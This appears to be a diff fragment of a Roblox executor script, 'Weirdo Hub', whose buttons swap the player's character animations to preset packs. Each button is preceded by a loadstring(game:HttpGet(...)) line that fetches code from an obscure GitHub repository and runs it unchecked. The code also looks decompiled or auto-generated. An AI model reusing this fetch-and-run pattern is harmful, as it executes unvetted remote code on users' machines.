+  b.AnimationId = "http://www.roblox.com/asset/?id=782842708"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=782847020"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=782843869"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=782846423"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Mage Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=707742142"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=707855907"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=707897309"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=707861613"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=707853694"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=707826056"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Elder Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=845397899"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=845400520"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=845403856"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=845386501"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=845398858"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=845392038"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=845396048"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Ninja Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=656117400"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=656118341"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=656121766"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=656118852"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=656114359"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=656115606"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Zombie Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=616158929"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=616160636"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616161997"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616156119"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616157476"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Stylish Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=616136790"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=616138447"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616146177"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616140816"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616139451"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616133594"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616134815"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Robot Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=616088211"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=616089559"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616095330"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616091570"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616090535"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616086039"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616087089"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Bubbly Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=910004836"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=910009958"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=910034870"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=910025107"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=910016857"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=910001910"
+  b = a.swimidle
+  b = b.SwimIdle
+  b.AnimationId = "http://www.roblox.com/asset/?id=910030921"
+  b = a.swim
+  b = b.Swim
+  b.AnimationId = "http://www.roblox.com/asset/?id=910028158"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=909997997"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Cartoony Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=742637544"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=742638445"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=742640026"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=742638842"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=742637942"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=742636889"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=742637151"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Superhero Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=616111295"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=616113536"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616122287"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616117076"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616104706"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616108001"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Astronaut Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=891621366"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=891633237"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=891667138"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=891636393"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=891627522"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=891609353"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=891617961"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Levitation Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616010382"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616003713"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Knight Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=657595757"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=657568135"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=657552124"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=657564596"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=658409194"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=658360781"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=657600338"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Pirate Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=750781874"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=750782770"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=750785693"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=750783738"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=750782230"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=750779899"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=750780242"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Vampire Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Werewolf Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Old School Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "rbxassetid://5319828216"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "rbxassetid://5319831086"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "rbxassetid://5319847204"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "rbxassetid://5319844329"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "rbxassetid://5319841935"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "rbxassetid://5319816685"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "rbxassetid://5319839762"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Rthro Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Ud'zal Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "rbxassetid://3303162274"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "rbxassetid://3303162549"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "rbxassetid://3303162967"
+  b = a.run
